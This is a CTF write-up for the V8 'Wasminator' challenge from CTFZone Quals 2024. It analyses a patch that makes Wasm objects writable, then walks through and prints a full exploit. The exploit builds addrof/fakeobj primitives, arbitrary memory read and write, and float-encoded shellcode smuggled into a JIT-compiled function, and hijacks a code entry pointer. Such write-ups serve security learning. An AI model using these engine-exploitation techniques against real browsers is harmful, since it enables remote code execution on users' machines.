---
title: "CTFZone Quals 2024 - Wasminator"
description: 
date: 2024-08-22T16:55:07+05:30
image: 
math: 
license: 
hidden: false
comments: true
draft: false
categories:
  - CTF Writeup
  - Browser Exploitation
tags:
  - CTFZone Quals 2024
  - V8
  - Browser Exploitation
---

## Introduction
I tried this challenge during the CTF but wasnt able to solve it. The challenge had 0 solves in the end. So I tried solving it after the CTF ended. 

## Patch Analysis

```patch=
diff --git a/src/objects/objects.cc b/src/objects/objects.cc
index 71c4b37adcc..0f670bdd7d1 100644
--- a/src/objects/objects.cc
+++ b/src/objects/objects.cc
@@ -2228,8 +2228,9 @@ Maybe<bool> Object::SetPropertyInternal(LookupIterator* it,
       }
 
       case LookupIterator::WASM_OBJECT:
-        RETURN_FAILURE(it->isolate(), kThrowOnError,
-                       NewTypeError(MessageTemplate::kWasmObjectsAreOpaque));
+        //RETURN_FAILURE(it->isolate(), kThrowOnError,
+        //               NewTypeError(MessageTemplate::kWasmObjectsAreOpaque));
+        return SetDataProperty(it, value);
 
       case LookupIterator::INTERCEPTOR: {
         if (it->HolderIsReceiverOrHiddenPrototype()) {

```

With this patch, instead of returning a failure and throwing a `TypeError` indicating that WASM objects are opaque, the code now calls `SetDataProperty(it, value)`, allowing us to modify the properties of the `WASM_OBJECT`.

## Exploitation

### Helper Functions

```js
let fi_buf = new ArrayBuffer(8);
let f_buf = new Float64Array(fi_buf);
let i_buf = new BigUint64Array(fi_buf);

function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}


function lower(i) {
        return i&BigInt(0xffffffff);
}
function upper(i){ 
        return (i>>32n)&BigInt(0xffffffff);
}


function hex(i) {
        start = "";
        content = i.toString(16);
        return start + "0x" + content;
}

```

### Building WebAssembly Module
We can build a WebAssembly module using the wasm-module-builder.js in our exploit script.

```js
d8.file.execute(`test/mjsunit/wasm/wasm-module-builder.js`);

let builder = new WasmModuleBuilder();

let array = builder.addArray(kWasmI32, true);

builder.addFunction('createArray', makeSig([kWasmI32], [kWasmExternRef]))

  .addBody([

      kExprLocalGet, 0, 

      kGCPrefix, kExprArrayNewDefault, array,

      kGCPrefix, kExprExternConvertAny,

          ])

    .exportFunc();
```
`makeSig([kWasmI32], [kWasmExternRef])` defines the function signature, It takes a i32 parameter and returns an external reference.
This function essentially takes an argument and creates an array with that argument as its size. Then using `kExprExternConvertAny` it creates an external reference so that it can be used in JavaScript.

### Constructing Primitives

When adding properties to an object, V8 usually places them in the property array. In case of Wasm Objects, It doesnt have a property array. Lets create an array and see how the object layout is in wasm object's case.

```js
var w_array = wasm.createArray(0x1337);
```
![image](wasminator/array.png)    
We can see that the size is placed right after the map, where, in a typical JSObject, the properties array would be located. However, since this is a Wasm Object, it lacks a properties array, and due to the patch, we can manipulate these values.

So we can store any address in the size and directly change the values in that address. Now lets try to do that.

Object layout of `arr1`
```shell
0x24c6081f46f1 <JSArray[1]>
V8 version 12.7.224.12
d8>
```
```shell
pwndbg> x/8gx 0x24c6081f46f1-1
0x24c6081f46f0: 0x08000725081cce15      0x0000000208394db5
0x24c6081f4700: 0x0000000808000635      0x0000000000000004
```
The size is stored as `size<<1` which is the upper part of `0x0000000208394db5`. We now create an array using the wasm module with the address as its size and overwrite that address with a large value.

```js
var w_array = wasm.createArray(0x81f46f9); // address of arr + 8
w_array[0] = 0xffff;
```

Now if we check the size, we can see that it is overwritten.

```js
%DebugPrint(arr1);
console.log(arr1.length)
var w_array = wasm.createArray(0x81f4791);
w_array[0] = 0xffff;
console.log(arr1.length)
```

```shell
0x0b01081f4789 <JSArray[1]>
1
65535
V8 version 12.7.224.12
d8>
```

Now that we have overwritten the array size we now have out of bounds access. Using this we construct addrof and fakeobj primitives.

```js
let arr1 = [{}];
let arr2 = [1.1];
.
.
.
function addrof(obj){
  arr1[0]=obj;
  return lower(ftoi(arr2[2]));
}

function fakeobj(addr){
  arr2[2]=itof(addr);
  return arr1[0];
}
```

Now let's turn these into arbitrary read and write. For that we need to construct a fake object whose values are under our control.

Lets take a look at an array object
```js
let temp = [1.1,2.2];
```
```shell
0x045d0808f2a5 <JSArray[2]>
V8 version 12.7.224.12
d8>
```
```shell
pwndbg> x/gx 0x045d0808f2a5-1
0x45d0808f2a4:  0x08000725081cce15
```
We can use that as the map value for our fake object since we want the fake object to be a float array. The next four bytes should have the address of the properties array and the next four is the length.
for example:
```shell
pwndbg> x/gx 0x045d0808f2a5+8-1
0x45d0808f2ac:  0x000000040808f2bd
```
Then we call fakeobj at the start of this fake structure which gives us an object we can totally control.

```js
let temp = [1.1,2.2];
temp[0] = itof(0x08000725081cce15n);
temp[1] =itof(0x1fffe<<32n);

temp_addr = addrof(temp);
fake_object = fakeobj(temp_addr+0x20n);
```

Now we can change the address part of the second value in the structure to read or write to any memory, this gives us arbitrary read and write.

```js
function arb_write(addr,val){
  temp_addr[1]=itof((0x1fffen<<32n)+addr-8n);
  fake_object[0]=itof(val);
}

function arb_read(addr){
  temp_addr[1]=itof((0x1fffen<<32n)+addr-8n);
  return ftoi(fake_object[0]);
}
```

So what's next? How do we escape the v8 sandbox and get RIP control?

If we look at the build arguments provided, we can see that `v8_enable_external_code_space` is set to `false`. On default (set to true), the code pointer it stored in a seperate region than the v8 heap. Now that its disabled, the code pointer is still there in v8 heap region.
You can refer to this [blog](https://mem2019.github.io/jekyll/update/2022/02/06/DiceCTF-Memory-Hole.html) for detailed explanation about this.

To simply put, Jitted Function objects have a `code` pointer. At an offset to this address we have `code_entry_point` pointer. This consists of the instructions which are going to be executed when the function is called. So if we overwrite that entry point value, we can hijack the control flow.

```js
pwn_addr = addrof(pwn);
var code = lower(arb_read(pwn_addr+0xcn));
var code_entry_rwx = arb_read(code+0x14n);
arb_write(code+0x14n,code_entry_rwx+0x60n);
```

We smuggle the shellcode into the jitted function by converting it into floating-point numbers so that it is stored in hexadecimal form in memory. So we overwrite the code entry point to starting of the smuggled shellcode.

![pwned](wasminator/exp.gif)


## Full Exploit

```js
d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');
let fi_buf = new ArrayBuffer(8);
let f_buf = new Float64Array(fi_buf);
let i_buf = new BigUint64Array(fi_buf);

function ftoi(f) {
    f_buf[0] = f;
    return i_buf[0];
}

function itof(i) {
    i_buf[0] = i;
    return f_buf[0];
}

function lower(i) {
        return i&BigInt(0xffffffff);
}
function upper(i){ 
        return (i>>32n)&BigInt(0xffffffff);
}


function hex(i) {
        start = "";
        content = i.toString(16);
        return start + "0x" + content;
}

function pwn(){
    return [
		1.95538254221075331056310651818E-246,
		1.95606125582421466942709801013E-246,
		1.99957147195425773436923756715E-246,
		1.95337673326740932133292175341E-246,
		2.63486047652296056448306022844E-284];
};

let arr1 = [{}];
let arr2 = [1.1];

for(let i=0;i<0x10000;i++)
    pwn();

let builder = new WasmModuleBuilder();

let array = builder.addArray(kWasmI32, true);

builder.addFunction('createArray', makeSig([kWasmI32], [kWasmExternRef]))

  .addBody([

      kExprLocalGet, 0,

      kGCPrefix, kExprArrayNewDefault, array,

      kGCPrefix, kExprExternConvertAny,

          ])

    .exportFunc();

function write_val(arr,val){
  arr[0] = val;
  return;
}

let instance = builder.instantiate({});

let wasm = instance.exports;


var w_array = wasm.createArray(0x082d0641+8);
w_array[0] = 0xffff;
console.log("Target arr length --> " + arr2.length) 

function addrof(obj){
  arr1[0]=obj;
  return lower(ftoi(arr2[2]));
}

function fakeobj(addr){
  arr2[2]=itof(addr);
  return arr1[0];
}


function arb_write(addr,val){
    temp[1]=itof((0x1fffen<<32n)+addr-8n);
    fake_object[0]=itof(val);
}
  
function arb_read(addr){
    temp[1]=itof((0x1fffen<<32n)+addr-8n);
    return ftoi(fake_object[0]);
} 

let temp = [1.1,1.1]
temp[0] = itof(0x08000725081cce15n);
temp[1] =itof(0x1fffen<<32n);

temp_addr = addrof(temp);

console.log(hex(temp_addr.toString(16)));

fake_object = fakeobj(temp_addr+0x20n);

pwn_addr = addrof(pwn);

var code = arb_read(pwn_addr+0xcn) &0xffffffffn;

console.log(hex(code.toString(16)));

var code_start = arb_read(code+0x14n)

arb_write(code+0x14n,code_start+0x60n);

console.log("Pwned!!");

pwn();

```

## Conclusion

It was fun solving this, thanks to @phoen1xxx for helping me out with the challenge. If you find any mistakes or have any doubts/suggestions feel free to [contact me](https://twitter.com/0xspektre) :)